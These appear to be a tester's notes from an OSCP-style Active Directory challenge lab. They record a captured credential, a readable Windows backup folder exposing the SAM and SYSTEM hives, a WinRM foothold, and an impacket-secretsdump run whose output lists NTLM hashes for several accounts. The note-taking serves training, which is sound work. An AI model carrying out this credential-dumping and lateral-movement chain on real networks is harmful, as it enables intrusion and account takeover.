### ++ Approach 10.10.97.142 ++
#### Credentials
	* celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd

#### Services
	##### 22 SSH
		- 

### ++ Vulnerabilities ++

#### Vuln 1: Windows copy folder in C:\ readable for users with low privileges ++
	* With celia.almeda we can extract SAM and SYSTEM from C:\windows\old and dump credentials of tom_admin to move to DC01

### ++ System Interaction ++
#### Foothold as celia.almeda
	* Use WinRM and celia.almeda credentials to get a shell in MS02

#### AD Pwning
	* Abuse vuln 1 and get tom_admin creds, which is a DC admin


┌──(kali㉿kali)-[/Shared/…/Challenge-Labs/4-OSCP-A-2nd/Active-directory/resources]
└─$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
[*] Cleaning up...